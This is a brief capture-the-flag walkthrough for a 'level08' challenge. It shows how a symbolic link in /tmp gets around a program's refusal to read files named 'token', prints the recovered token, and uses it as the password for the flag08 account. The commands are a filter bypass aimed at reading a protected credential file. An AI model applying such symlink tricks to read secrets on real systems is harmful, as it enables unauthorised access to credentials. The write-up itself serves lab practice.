./level08 takes in a paramter and cats out a file. But won't take anything with "token" in the name.

We also don't have read permission on the token file.

Create symbolic link to a file in temp.

ln -s ~/token /tmp/this

./level08 /tmp/this

Outputs token:
quif5eloekouj29ke0vouxean

Then can run su flag08 with token as password

and run getflag after
